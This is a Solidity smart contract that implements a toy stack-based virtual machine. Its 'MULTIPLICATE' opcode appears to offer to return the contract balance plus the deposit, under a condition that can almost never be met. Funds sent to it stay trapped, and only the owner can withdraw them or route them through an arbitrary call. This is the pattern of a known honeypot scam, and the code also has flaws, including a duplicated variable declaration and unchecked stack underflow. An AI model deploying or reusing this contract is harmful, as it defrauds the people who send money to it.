pragma solidity ^0.4.18;

contract VM {
    address public Owner = msg.sender;
    
    function() public payable {}
    
    function execute(uint[] program) public payable {
        uint[] memory stack = new uint[](256);
        uint sp = 0;
        uint pc = 0;
        
        while (pc < program.length) {
            uint opcode = program[pc];
            pc++;
            
            if (opcode == 0) { // PUSH
                stack[sp] = program[pc];
                sp++;
                pc++;
            } else if (opcode == 1) { // POP
                sp--;
            } else if (opcode == 2) { // ADD
                sp--;
                stack[sp - 1] = stack[sp - 1] + stack[sp];
            } else if (opcode == 3) { // SUB
                sp--;
                stack[sp - 1] = stack[sp - 1] - stack[sp];
            } else if (opcode == 4) { // JMP
                pc = program[pc];
            } else if (opcode == 5) { // JZ
                if (stack[sp - 1] == 0) {
                    pc = program[pc];
                } else {
                    pc++;
                }
                sp--;
            } else if (opcode == 6) { // LOAD
                stack[sp] = stack[program[pc]];
                sp++;
                pc++;
            } else if (opcode == 7) { // STORE
                sp--;
                stack[program[pc]] = stack[sp];
                pc++;
            } else if (opcode == 8) { // WITHDRAW
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
            } else if (opcode == 9) { // COMMAND
                require(msg.sender == Owner);
                address adr = address(stack[--sp]);
                bytes memory data = new bytes(stack[--sp]);
                for (uint i = 0; i < data.length; i++) {
                    data[i] = byte(stack[--sp]);
                }
                adr.call.value(msg.value)(data);
            } else if (opcode == 10) { // MULTIPLICATE
                address adr = address(stack[--sp]);
                if (msg.value >= this.balance) {
                    adr.transfer(this.balance + msg.value);
                }
            }
        }
    }
}